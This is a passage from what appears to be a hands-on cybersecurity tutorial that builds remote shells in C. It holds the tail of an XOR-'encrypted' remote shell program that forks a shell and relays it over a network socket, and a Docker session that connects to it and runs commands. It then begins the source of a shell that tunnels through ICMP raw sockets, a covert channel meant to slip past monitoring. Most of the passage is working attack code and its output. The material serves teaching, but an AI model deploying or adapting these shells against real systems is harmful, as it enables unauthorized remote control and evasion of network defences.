    <span id="cb228-153"><a href="#cb228-153" aria-hidden="true" tabindex="-1"></a>                FD_ZERO<span class="op">(&amp;</span>rfds<span class="op">);</span></span>
    <span id="cb228-154"><a href="#cb228-154" aria-hidden="true" tabindex="-1"></a>                FD_SET<span class="op">(</span>s<span class="op">,&amp;</span>rfds<span class="op">);</span></span>
    <span id="cb228-155"><a href="#cb228-155" aria-hidden="true" tabindex="-1"></a>                FD_SET<span class="op">(</span>s1<span class="op">,&amp;</span>rfds<span class="op">);</span></span>
    <span id="cb228-156"><a href="#cb228-156" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb228-157"><a href="#cb228-157" aria-hidden="true" tabindex="-1"></a>                <span class="co">/* Time out. */</span></span>
    <span id="cb228-158"><a href="#cb228-158" aria-hidden="true" tabindex="-1"></a>                <span class="co">// set to 1 second</span></span>
    <span id="cb228-159"><a href="#cb228-159" aria-hidden="true" tabindex="-1"></a>                <span class="co">// microseconds resolution</span></span>
    <span id="cb228-160"><a href="#cb228-160" aria-hidden="true" tabindex="-1"></a>                tv<span class="op">.</span>tv_sec <span class="op">=</span> <span class="dv">1</span><span class="op">;</span></span>
    <span id="cb228-161"><a href="#cb228-161" aria-hidden="true" tabindex="-1"></a>                tv<span class="op">.</span>tv_usec <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span>
    <span id="cb228-162"><a href="#cb228-162" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb228-163"><a href="#cb228-163" aria-hidden="true" tabindex="-1"></a>                <span class="co">// standard select loop for a network application.</span></span>
    <span id="cb228-164"><a href="#cb228-164" aria-hidden="true" tabindex="-1"></a>                <span class="cf">if</span> <span class="op">((</span>r <span class="op">=</span> select <span class="op">(</span>max<span class="op">,</span> <span class="op">&amp;</span>rfds<span class="op">,</span> NULL<span class="op">,</span> NULL<span class="op">,</span> <span class="op">&amp;</span>tv<span class="op">))</span> <span class="op">&lt;</span> <span class="dv">0</span><span class="op">)</span></span>
    <span id="cb228-165"><a href="#cb228-165" aria-hidden="true" tabindex="-1"></a>                <span class="op">{</span></span>
    <span id="cb228-166"><a href="#cb228-166" aria-hidden="true" tabindex="-1"></a>                        perror <span class="op">(</span><span class="st">&quot;select:&quot;</span><span class="op">);</span></span>
    <span id="cb228-167"><a href="#cb228-167" aria-hidden="true" tabindex="-1"></a>                        exit <span class="op">(</span>EXIT_FAILURE<span class="op">);</span></span>
    <span id="cb228-168"><a href="#cb228-168" aria-hidden="true" tabindex="-1"></a>                <span class="op">}</span></span>
    <span id="cb228-169"><a href="#cb228-169" aria-hidden="true" tabindex="-1"></a>                <span class="cf">else</span> <span class="cf">if</span> <span class="op">(</span>r <span class="op">&gt;</span> <span class="dv">0</span><span class="op">)</span> <span class="co">/* If there is data to process */</span></span>
    <span id="cb228-170"><a href="#cb228-170" aria-hidden="true" tabindex="-1"></a>                <span class="op">{</span></span>
    <span id="cb228-171"><a href="#cb228-171" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb228-172"><a href="#cb228-172" aria-hidden="true" tabindex="-1"></a>                  <span class="co">// The memfrob function does a XOR crypting with</span></span>
    <span id="cb228-173"><a href="#cb228-173" aria-hidden="true" tabindex="-1"></a>                  <span class="co">// key (42). The greatest thing about XOR crypting is that the</span></span>
    <span id="cb228-174"><a href="#cb228-174" aria-hidden="true" tabindex="-1"></a>                  <span class="co">// same function can be used for crypt and decrypt. Other than</span></span>
    <span id="cb228-175"><a href="#cb228-175" aria-hidden="true" tabindex="-1"></a>                  <span class="co">// that, with a 1 byte long key (42 in this case) it is pretty</span></span>
    <span id="cb228-176"><a href="#cb228-176" aria-hidden="true" tabindex="-1"></a>                  <span class="co">// useless.</span></span>
    <span id="cb228-177"><a href="#cb228-177" aria-hidden="true" tabindex="-1"></a>                        <span class="cf">if</span> <span class="op">(</span>FD_ISSET<span class="op">(</span>s<span class="op">,</span> <span class="op">&amp;</span>rfds<span class="op">))</span></span>
    <span id="cb228-178"><a href="#cb228-178" aria-hidden="true" tabindex="-1"></a>                        <span class="op">{</span></span>
    <span id="cb228-179"><a href="#cb228-179" aria-hidden="true" tabindex="-1"></a>                                <span class="co">// get data in our network socket, we just read the data,</span></span>
    <span id="cb228-180"><a href="#cb228-180" aria-hidden="true" tabindex="-1"></a>                                <span class="co">// decrypt it and resend it to our shell.</span></span>
    <span id="cb228-181"><a href="#cb228-181" aria-hidden="true" tabindex="-1"></a>                                memset <span class="op">(</span>buffer<span class="op">,</span> <span class="dv">0</span><span class="op">,</span> <span class="dv">1024</span><span class="op">);</span></span>
    <span id="cb228-182"><a href="#cb228-182" aria-hidden="true" tabindex="-1"></a>                                <span class="cf">if</span> <span class="op">((</span>len <span class="op">=</span> read <span class="op">(</span>s<span class="op">,</span> buffer<span class="op">,</span> <span class="dv">1024</span><span class="op">))</span> <span class="op">&lt;=</span> <span class="dv">0</span><span class="op">)</span> exit <span class="op">(</span><span class="dv">1</span><span class="op">);</span></span>
    <span id="cb228-183"><a href="#cb228-183" aria-hidden="true" tabindex="-1"></a>                                memfrob <span class="op">(</span>buffer<span class="op">,</span> len<span class="op">);</span></span>
    <span id="cb228-184"><a href="#cb228-184" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb228-185"><a href="#cb228-185" aria-hidden="true" tabindex="-1"></a>                                write <span class="op">(</span>s1<span class="op">,</span> buffer<span class="op">,</span> len<span class="op">);</span></span>
    <span id="cb228-186"><a href="#cb228-186" aria-hidden="true" tabindex="-1"></a>                        <span class="op">}</span></span>
    <span id="cb228-187"><a href="#cb228-187" aria-hidden="true" tabindex="-1"></a>                        <span class="cf">if</span> <span class="op">(</span>FD_ISSET<span class="op">(</span>s1<span class="op">,</span> <span class="op">&amp;</span>rfds<span class="op">))</span></span>
    <span id="cb228-188"><a href="#cb228-188" aria-hidden="true" tabindex="-1"></a>                        <span class="op">{</span></span>
    <span id="cb228-189"><a href="#cb228-189" aria-hidden="true" tabindex="-1"></a>                                <span class="co">// get data from our shell, we read it, we crypt it and</span></span>
    <span id="cb228-190"><a href="#cb228-190" aria-hidden="true" tabindex="-1"></a>                                <span class="co">// we send it back to the network client.</span></span>
    <span id="cb228-191"><a href="#cb228-191" aria-hidden="true" tabindex="-1"></a>                                memset <span class="op">(</span>buffer<span class="op">,</span> <span class="dv">0</span><span class="op">,</span> <span class="dv">1024</span><span class="op">);</span></span>
    <span id="cb228-192"><a href="#cb228-192" aria-hidden="true" tabindex="-1"></a>                                <span class="cf">if</span> <span class="op">((</span>len <span class="op">=</span> read <span class="op">(</span>s1<span class="op">,</span> buffer<span class="op">,</span> <span class="dv">1024</span><span class="op">))</span> <span class="op">&lt;=</span> <span class="dv">0</span><span class="op">)</span> exit <span class="op">(</span><span class="dv">1</span><span class="op">);</span></span>
    <span id="cb228-193"><a href="#cb228-193" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb228-194"><a href="#cb228-194" aria-hidden="true" tabindex="-1"></a>                                memfrob <span class="op">(</span>buffer<span class="op">,</span> len<span class="op">);</span></span>
    <span id="cb228-195"><a href="#cb228-195" aria-hidden="true" tabindex="-1"></a>                                write <span class="op">(</span>s<span class="op">,</span> buffer<span class="op">,</span> len<span class="op">);</span></span>
    <span id="cb228-196"><a href="#cb228-196" aria-hidden="true" tabindex="-1"></a>                        <span class="op">}</span></span>
    <span id="cb228-197"><a href="#cb228-197" aria-hidden="true" tabindex="-1"></a>                <span class="op">}</span></span>
    <span id="cb228-198"><a href="#cb228-198" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
    <span id="cb228-199"><a href="#cb228-199" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
    <span id="cb228-200"><a href="#cb228-200" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb228-201"><a href="#cb228-201" aria-hidden="true" tabindex="-1"></a><span class="co">// Set up the socket pair and create a new process (using fork)</span></span>
    <span id="cb228-202"><a href="#cb228-202" aria-hidden="true" tabindex="-1"></a><span class="co">//</span></span>
    <span id="cb228-203"><a href="#cb228-203" aria-hidden="true" tabindex="-1"></a><span class="co">// Function creates a socket pair using the syscall socketpair).</span></span>
    <span id="cb228-204"><a href="#cb228-204" aria-hidden="true" tabindex="-1"></a><span class="co">// The fork system call creates a new process as an identical image</span></span>
    <span id="cb228-205"><a href="#cb228-205" aria-hidden="true" tabindex="-1"></a><span class="co">// that make use of the sp socketpair to communicate both processes.</span></span>
    <span id="cb228-206"><a href="#cb228-206" aria-hidden="true" tabindex="-1"></a><span class="co">//</span></span>
    <span id="cb228-207"><a href="#cb228-207" aria-hidden="true" tabindex="-1"></a><span class="co">// Instead of feeding data into our shell directly from the network,</span></span>
    <span id="cb228-208"><a href="#cb228-208" aria-hidden="true" tabindex="-1"></a><span class="co">// function is used to send/receive data using the counterpart socket</span></span>
    <span id="cb228-209"><a href="#cb228-209" aria-hidden="true" tabindex="-1"></a><span class="co">// provided by socketpair.</span></span>
    <span id="cb228-210"><a href="#cb228-210" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span></span>
    <span id="cb228-211"><a href="#cb228-211" aria-hidden="true" tabindex="-1"></a>secure_shell <span class="op">(</span><span class="dt">int</span> s<span class="op">)</span></span>
    <span id="cb228-212"><a href="#cb228-212" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
    <span id="cb228-213"><a href="#cb228-213" aria-hidden="true" tabindex="-1"></a>        pid_t pid<span class="op">;</span></span>
    <span id="cb228-214"><a href="#cb228-214" aria-hidden="true" tabindex="-1"></a>        <span class="dt">int</span> sp<span class="op">[</span><span class="dv">2</span><span class="op">];</span></span>
    <span id="cb228-215"><a href="#cb228-215" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb228-216"><a href="#cb228-216" aria-hidden="true" tabindex="-1"></a>        <span class="co">/* Create a socketpair to talk to the child process */</span></span>
    <span id="cb228-217"><a href="#cb228-217" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">((</span>socketpair <span class="op">(</span>AF_UNIX<span class="op">,</span> SOCK_STREAM<span class="op">,</span> <span class="dv">0</span><span class="op">,</span> sp<span class="op">))</span> <span class="op">&lt;</span> <span class="dv">0</span><span class="op">)</span></span>
    <span id="cb228-218"><a href="#cb228-218" aria-hidden="true" tabindex="-1"></a>        <span class="op">{</span></span>
    <span id="cb228-219"><a href="#cb228-219" aria-hidden="true" tabindex="-1"></a>                perror <span class="op">(</span><span class="st">&quot;socketpair:&quot;</span><span class="op">);</span></span>
    <span id="cb228-220"><a href="#cb228-220" aria-hidden="true" tabindex="-1"></a>                exit <span class="op">(</span><span class="dv">1</span><span class="op">);</span></span>
    <span id="cb228-221"><a href="#cb228-221" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
    <span id="cb228-222"><a href="#cb228-222" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb228-223"><a href="#cb228-223" aria-hidden="true" tabindex="-1"></a>        <span class="co">/* Fork a shell */</span></span>
    <span id="cb228-224"><a href="#cb228-224" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">((</span>pid <span class="op">=</span> fork <span class="op">())</span> <span class="op">&lt;</span> <span class="dv">0</span><span class="op">)</span></span>
    <span id="cb228-225"><a href="#cb228-225" aria-hidden="true" tabindex="-1"></a>        <span class="op">{</span></span>
    <span id="cb228-226"><a href="#cb228-226" aria-hidden="true" tabindex="-1"></a>                perror <span class="op">(</span><span class="st">&quot;fork:&quot;</span><span class="op">);</span></span>
    <span id="cb228-227"><a href="#cb228-227" aria-hidden="true" tabindex="-1"></a>                exit <span class="op">(</span><span class="dv">1</span><span class="op">);</span></span>
    <span id="cb228-228"><a href="#cb228-228" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
    <span id="cb228-229"><a href="#cb228-229" aria-hidden="true" tabindex="-1"></a>        <span class="cf">else</span></span>
    <span id="cb228-230"><a href="#cb228-230" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(!</span>pid<span class="op">)</span> <span class="co">/* Child Process */</span></span>
    <span id="cb228-231"><a href="#cb228-231" aria-hidden="true" tabindex="-1"></a>        <span class="op">{</span></span>
    <span id="cb228-232"><a href="#cb228-232" aria-hidden="true" tabindex="-1"></a>                close <span class="op">(</span>sp<span class="op">[</span><span class="dv">1</span><span class="op">]);</span></span>
    <span id="cb228-233"><a href="#cb228-233" aria-hidden="true" tabindex="-1"></a>                close <span class="op">(</span>s<span class="op">);</span></span>
    <span id="cb228-234"><a href="#cb228-234" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb228-235"><a href="#cb228-235" aria-hidden="true" tabindex="-1"></a>                start_shell <span class="op">(</span>sp<span class="op">[</span><span class="dv">0</span><span class="op">]);</span></span>
    <span id="cb228-236"><a href="#cb228-236" aria-hidden="true" tabindex="-1"></a>                <span class="co">/* This function will never return */</span></span>
    <span id="cb228-237"><a href="#cb228-237" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
    <span id="cb228-238"><a href="#cb228-238" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb228-239"><a href="#cb228-239" aria-hidden="true" tabindex="-1"></a>        <span class="co">/* At this point we are the father process */</span></span>
    <span id="cb228-240"><a href="#cb228-240" aria-hidden="true" tabindex="-1"></a>        close <span class="op">(</span>sp<span class="op">[</span><span class="dv">0</span><span class="op">]);</span></span>
    <span id="cb228-241"><a href="#cb228-241" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb228-242"><a href="#cb228-242" aria-hidden="true" tabindex="-1"></a>        printf <span class="op">(</span><span class="st">&quot;+ Starting async read loop</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
    <span id="cb228-243"><a href="#cb228-243" aria-hidden="true" tabindex="-1"></a>        async_read <span class="op">(</span>s<span class="op">,</span> sp<span class="op">[</span><span class="dv">1</span><span class="op">]);</span></span>
    <span id="cb228-244"><a href="#cb228-244" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb228-245"><a href="#cb228-245" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
    <span id="cb228-246"><a href="#cb228-246" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb228-247"><a href="#cb228-247" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span></span>
    <span id="cb228-248"><a href="#cb228-248" aria-hidden="true" tabindex="-1"></a>main <span class="op">(</span><span class="dt">int</span> argc<span class="op">,</span> <span class="dt">char</span> <span class="op">*</span>argv<span class="op">[])</span></span>
    <span id="cb228-249"><a href="#cb228-249" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
    <span id="cb228-250"><a href="#cb228-250" aria-hidden="true" tabindex="-1"></a>        <span class="co">/* </span><span class="al">FIXME</span><span class="co">: Check command-line arguments */</span></span>
    <span id="cb228-251"><a href="#cb228-251" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>argv<span class="op">[</span><span class="dv">1</span><span class="op">][</span><span class="dv">0</span><span class="op">]</span> <span class="op">==</span> <span class="ch">&#39;c&#39;</span><span class="op">)</span></span>
    <span id="cb228-252"><a href="#cb228-252" aria-hidden="true" tabindex="-1"></a>                secure_shell <span class="op">(</span>client_init <span class="op">(</span>argv<span class="op">[</span><span class="dv">2</span><span class="op">],</span> atoi<span class="op">(</span>argv<span class="op">[</span><span class="dv">3</span><span class="op">])));</span></span>
    <span id="cb228-253"><a href="#cb228-253" aria-hidden="true" tabindex="-1"></a>        <span class="cf">else</span> <span class="cf">if</span> <span class="op">(</span>argv<span class="op">[</span><span class="dv">1</span><span class="op">][</span><span class="dv">0</span><span class="op">]</span> <span class="op">==</span> <span class="ch">&#39;s&#39;</span><span class="op">)</span></span>
    <span id="cb228-254"><a href="#cb228-254" aria-hidden="true" tabindex="-1"></a>                secure_shell <span class="op">(</span>server_init <span class="op">(</span>atoi<span class="op">(</span>argv<span class="op">[</span><span class="dv">2</span><span class="op">])));</span></span>
    <span id="cb228-255"><a href="#cb228-255" aria-hidden="true" tabindex="-1"></a>        <span class="cf">else</span> <span class="cf">if</span> <span class="op">(</span>argv<span class="op">[</span><span class="dv">1</span><span class="op">][</span><span class="dv">0</span><span class="op">]</span> <span class="op">==</span> <span class="ch">&#39;a&#39;</span><span class="op">)</span></span>
    <span id="cb228-256"><a href="#cb228-256" aria-hidden="true" tabindex="-1"></a>                async_read <span class="op">(</span>client_init <span class="op">(</span>argv<span class="op">[</span><span class="dv">2</span><span class="op">],</span> atoi<span class="op">(</span>argv<span class="op">[</span><span class="dv">3</span><span class="op">])),</span> <span class="dv">0</span><span class="op">);</span></span>
    <span id="cb228-257"><a href="#cb228-257" aria-hidden="true" tabindex="-1"></a>        <span class="cf">else</span> <span class="cf">if</span> <span class="op">(</span>argv<span class="op">[</span><span class="dv">1</span><span class="op">][</span><span class="dv">0</span><span class="op">]</span> <span class="op">==</span> <span class="ch">&#39;b&#39;</span><span class="op">)</span></span>
    <span id="cb228-258"><a href="#cb228-258" aria-hidden="true" tabindex="-1"></a>                async_read <span class="op">(</span>server_init <span class="op">(</span>atoi<span class="op">(</span>argv<span class="op">[</span><span class="dv">2</span><span class="op">])),</span> <span class="dv">0</span><span class="op">);</span></span>
    <span id="cb228-259"><a href="#cb228-259" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb228-260"><a href="#cb228-260" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb228-261"><a href="#cb228-261" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
    <span id="cb228-262"><a href="#cb228-262" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
    <p>Let’s try it out:</p>
    <div class="sourceCode" id="cb229"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb229-1"><a href="#cb229-1" aria-hidden="true" tabindex="-1"></a><span class="co"># In one terminal</span></span>
    <span id="cb229-2"><a href="#cb229-2" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> run <span class="at">--privileged</span> <span class="at">-p</span> 5000:5000 <span class="at">-it</span> basic_cybersecurity6:latest</span>
    <span id="cb229-3"><a href="#cb229-3" aria-hidden="true" tabindex="-1"></a><span class="ex">root@ab97f27ecde6:~#</span> ./crypt_shell s 5000</span>
    <span id="cb229-4"><a href="#cb229-4" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb229-5"><a href="#cb229-5" aria-hidden="true" tabindex="-1"></a><span class="co"># In the other terminal</span></span>
    <span id="cb229-6"><a href="#cb229-6" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> docker ps</span>
    <span id="cb229-7"><a href="#cb229-7" aria-hidden="true" tabindex="-1"></a><span class="ex">CONTAINER</span> ID        IMAGE                         COMMAND             CREATED             STATUS              PORTS                    NAMES</span>
    <span id="cb229-8"><a href="#cb229-8" aria-hidden="true" tabindex="-1"></a><span class="ex">ab97f27ecde6</span>        basic_cybersecurity6:latest   <span class="st">&quot;bash&quot;</span>              2 minutes ago       Up 2 minutes        0.0.0.0:5000-<span class="op">&gt;</span>5000/tcp   pedantic_lamarr</span>
    <span id="cb229-9"><a href="#cb229-9" aria-hidden="true" tabindex="-1"></a><span class="ex">victor</span> at Victors-MacBook in ~/basic_cybersecurity/tutorial5 on master<span class="pp">*</span></span>
    <span id="cb229-10"><a href="#cb229-10" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> docker exec <span class="at">-it</span> ab97f27ecde6 bash</span>
    <span id="cb229-11"><a href="#cb229-11" aria-hidden="true" tabindex="-1"></a><span class="ex">root@ab97f27ecde6:~#</span> ./crypt_shell a 127.0.0.1 5000</span>
    <span id="cb229-12"><a href="#cb229-12" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> Connecting to 127.0.0.1:5000</span>
    <span id="cb229-13"><a href="#cb229-13" aria-hidden="true" tabindex="-1"></a><span class="co"># uname -a</span></span>
    <span id="cb229-14"><a href="#cb229-14" aria-hidden="true" tabindex="-1"></a><span class="ex">Linux</span> ab97f27ecde6 4.9.87-linuxkit-aufs <span class="co">#1 SMP Wed Mar 14 15:12:16 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span></span>
    <span id="cb229-15"><a href="#cb229-15" aria-hidden="true" tabindex="-1"></a><span class="co">#</span></span></code></pre></div>
    <h3 id="remote-shell-through-icmp">Remote shell through ICMP</h3>
    <p>The following content is based on [3]. The idea is to use an unusual communication channel with our remote shell. In particular, we’ll be using ICMP packets to transfer the shell data and commands between the two machines. The method described here generates an unusual ICMP traffic that may fire some alarms however it all depends on the scenario.</p>
    <p>The technique is actually pretty simple (and old). In a nutshell, we aim to:</p>
    <ul>
    <li>Change our client/server sockets into a RAW socket</li>
    <li>Write a sniffer to capture ICMP traffic</li>
    <li>Write a packet injector to send ICMP messages</li>
    </ul>
    <p>The complete source code has been commented for readibility and is presented below. It should be self-explanatory:</p>
    <div class="sourceCode" id="cb230"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb230-1"><a href="#cb230-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
    <span id="cb230-2"><a href="#cb230-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
    <span id="cb230-3"><a href="#cb230-3" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></span>
    <span id="cb230-4"><a href="#cb230-4" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;unistd.h&gt;</span></span>
    <span id="cb230-5"><a href="#cb230-5" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;sys/socket.h&gt;</span></span>
    <span id="cb230-6"><a href="#cb230-6" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;arpa/inet.h&gt;</span></span>
    <span id="cb230-7"><a href="#cb230-7" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;sys/time.h&gt;</span></span>
    <span id="cb230-8"><a href="#cb230-8" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;sys/types.h&gt;</span></span>
    <span id="cb230-9"><a href="#cb230-9" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;unistd.h&gt;</span></span>
    <span id="cb230-10"><a href="#cb230-10" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;linux/ip.h&gt;</span></span>
    <span id="cb230-11"><a href="#cb230-11" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;linux/icmp.h&gt;</span></span>
    <span id="cb230-12"><a href="#cb230-12" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-13"><a href="#cb230-13" aria-hidden="true" tabindex="-1"></a><span class="co">/* Helper functions */</span></span>
    <span id="cb230-14"><a href="#cb230-14" aria-hidden="true" tabindex="-1"></a><span class="pp">#define BUF_SIZE 1024</span></span>
    <span id="cb230-15"><a href="#cb230-15" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-16"><a href="#cb230-16" aria-hidden="true" tabindex="-1"></a><span class="co">// two function pointers that we can easily change (at run-time)</span></span>
    <span id="cb230-17"><a href="#cb230-17" aria-hidden="true" tabindex="-1"></a><span class="co">// to point to different implementation.</span></span>
    <span id="cb230-18"><a href="#cb230-18" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="dt">int</span> <span class="op">(*</span>net_read<span class="op">)(</span><span class="dt">int</span> fd<span class="op">,</span> <span class="dt">void</span> <span class="op">*</span>buf<span class="op">,</span> <span class="dt">size_t</span> count<span class="op">);</span></span>
    <span id="cb230-19"><a href="#cb230-19" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="dt">int</span> <span class="op">(*</span>net_write<span class="op">)</span> <span class="op">(</span><span class="dt">int</span> fd<span class="op">,</span> <span class="dt">void</span> <span class="op">*</span>buf<span class="op">,</span> <span class="dt">size_t</span> count<span class="op">);</span></span>
    <span id="cb230-20"><a href="#cb230-20" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-21"><a href="#cb230-21" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="dt">int</span> icmp_type <span class="op">=</span> ICMP_ECHOREPLY<span class="op">;;</span></span>
    <span id="cb230-22"><a href="#cb230-22" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="dt">int</span> id <span class="op">=</span> <span class="dv">12345</span><span class="op">;</span></span>
    <span id="cb230-23"><a href="#cb230-23" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-24"><a href="#cb230-24" aria-hidden="true" tabindex="-1"></a><span class="co">// This struc represents a packet as it is read from</span></span>
    <span id="cb230-25"><a href="#cb230-25" aria-hidden="true" tabindex="-1"></a><span class="co">// a IPPROTO_ICMP RAW socket. The RAW socket will return</span></span>
    <span id="cb230-26"><a href="#cb230-26" aria-hidden="true" tabindex="-1"></a><span class="co">// an IP header, then a ICMP header followed by the data.</span></span>
    <span id="cb230-27"><a href="#cb230-27" aria-hidden="true" tabindex="-1"></a><span class="co">//</span></span>
    <span id="cb230-28"><a href="#cb230-28" aria-hidden="true" tabindex="-1"></a><span class="co">// In this example, and again, to keep things simple,</span></span>
    <span id="cb230-29"><a href="#cb230-29" aria-hidden="true" tabindex="-1"></a><span class="co">// we are using a fixed packet format. Our data packet</span></span>
    <span id="cb230-30"><a href="#cb230-30" aria-hidden="true" tabindex="-1"></a><span class="co">// is composed of an integer indicating the size of the</span></span>
    <span id="cb230-31"><a href="#cb230-31" aria-hidden="true" tabindex="-1"></a><span class="co">// data in the packet, plus a data block with a maximum</span></span>
    <span id="cb230-32"><a href="#cb230-32" aria-hidden="true" tabindex="-1"></a><span class="co">// size of BUF_SIZE. So our packets will look like this:</span></span>
    <span id="cb230-33"><a href="#cb230-33" aria-hidden="true" tabindex="-1"></a><span class="co">//</span></span>
    <span id="cb230-34"><a href="#cb230-34" aria-hidden="true" tabindex="-1"></a><span class="co">// +-----------+-------------+-------------------+</span></span>
    <span id="cb230-35"><a href="#cb230-35" aria-hidden="true" tabindex="-1"></a><span class="co">// | IP Header | ICMP Header | Len  | shell data |</span></span>
    <span id="cb230-36"><a href="#cb230-36" aria-hidden="true" tabindex="-1"></a><span class="co">// |           +-------------+-------------------+</span></span>
    <span id="cb230-37"><a href="#cb230-37" aria-hidden="true" tabindex="-1"></a><span class="co">// +---------------------------------------------+</span></span>
    <span id="cb230-38"><a href="#cb230-38" aria-hidden="true" tabindex="-1"></a><span class="kw">typedef</span> <span class="kw">struct</span></span>
    <span id="cb230-39"><a href="#cb230-39" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
    <span id="cb230-40"><a href="#cb230-40" aria-hidden="true" tabindex="-1"></a>        <span class="kw">struct</span> iphdr ip<span class="op">;</span></span>
    <span id="cb230-41"><a href="#cb230-41" aria-hidden="true" tabindex="-1"></a>        <span class="kw">struct</span> icmphdr icmp<span class="op">;</span></span>
    <span id="cb230-42"><a href="#cb230-42" aria-hidden="true" tabindex="-1"></a>        <span class="dt">int</span> len<span class="op">;</span></span>
    <span id="cb230-43"><a href="#cb230-43" aria-hidden="true" tabindex="-1"></a>        <span class="dt">char</span> data<span class="op">[</span>BUF_SIZE<span class="op">];</span>     <span class="co">/* Data */</span></span>
    <span id="cb230-44"><a href="#cb230-44" aria-hidden="true" tabindex="-1"></a><span class="op">}</span> PKT<span class="op">;</span></span>
    <span id="cb230-45"><a href="#cb230-45" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-46"><a href="#cb230-46" aria-hidden="true" tabindex="-1"></a><span class="co">// struct to write into the network our shell data within</span></span>
    <span id="cb230-47"><a href="#cb230-47" aria-hidden="true" tabindex="-1"></a><span class="co">// ICMP packets.</span></span>
    <span id="cb230-48"><a href="#cb230-48" aria-hidden="true" tabindex="-1"></a><span class="co">//</span></span>
    <span id="cb230-49"><a href="#cb230-49" aria-hidden="true" tabindex="-1"></a><span class="co">// This represents the packet we will be sending. By default,</span></span>
    <span id="cb230-50"><a href="#cb230-50" aria-hidden="true" tabindex="-1"></a><span class="co">// sockets RAW does not give us access to the IP header. This</span></span>
    <span id="cb230-51"><a href="#cb230-51" aria-hidden="true" tabindex="-1"></a><span class="co">// is convenient as we do not have to care about feeding IP</span></span>
    <span id="cb230-52"><a href="#cb230-52" aria-hidden="true" tabindex="-1"></a><span class="co">// addressed or calculating checksums for the whole IP packet.</span></span>
    <span id="cb230-53"><a href="#cb230-53" aria-hidden="true" tabindex="-1"></a><span class="co">// It can indeed be forced, but in this case it is just not</span></span>
    <span id="cb230-54"><a href="#cb230-54" aria-hidden="true" tabindex="-1"></a><span class="co">// convenient. That is why our transmission packet does not</span></span>
    <span id="cb230-55"><a href="#cb230-55" aria-hidden="true" tabindex="-1"></a><span class="co">// have an IP header. If you need to access the IP header,</span></span>
    <span id="cb230-56"><a href="#cb230-56" aria-hidden="true" tabindex="-1"></a><span class="co">// you can do it using the IP_HDRINCL socket option</span></span>
    <span id="cb230-57"><a href="#cb230-57" aria-hidden="true" tabindex="-1"></a><span class="co">// (man 7 raw for more info).</span></span>
    <span id="cb230-58"><a href="#cb230-58" aria-hidden="true" tabindex="-1"></a><span class="kw">typedef</span> <span class="kw">struct</span> <span class="op">{</span></span>
    <span id="cb230-59"><a href="#cb230-59" aria-hidden="true" tabindex="-1"></a>        <span class="kw">struct</span> icmphdr icmp<span class="op">;</span></span>
    <span id="cb230-60"><a href="#cb230-60" aria-hidden="true" tabindex="-1"></a>        <span class="dt">int</span> len<span class="op">;</span></span>
